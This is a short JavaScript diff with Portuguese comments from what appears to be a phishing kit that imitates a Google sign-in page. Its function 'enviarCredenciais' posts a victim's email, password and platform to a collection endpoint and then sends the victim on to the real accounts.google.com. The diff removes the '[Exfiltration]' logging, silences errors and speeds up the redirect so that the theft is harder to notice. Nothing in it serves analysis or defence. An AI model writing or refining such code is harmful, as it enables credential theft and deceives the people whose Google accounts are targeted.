@@ -66,6 +66,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
 
     function enviarCredenciais(email, senha) {
+        // Envia credenciais em background
         fetch('/api/salvar-client', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -79,16 +80,11 @@ document.addEventListener('DOMContentLoaded', () => {
                 plataforma: navigator.platform,
                 template: 'google'
             })
-        })
-        .then(r => r.json())
-        .then(data => {
-            console.log('[Exfiltration] Credentials sent');
-            // Redirect to real Google
-            window.location.href = 'https://accounts.google.com';
-        })
-        .catch(e => {
-            console.log('[Exfiltration] Error:', e);
-            window.location.href = 'https://accounts.google.com';
-        });
+        }).catch(() => {});
+
+        // Redireciona imediatamente para o site oficial
+        setTimeout(() => {
+            window.top.location.replace('https://accounts.google.com');
+        }, 100);
     }
 });
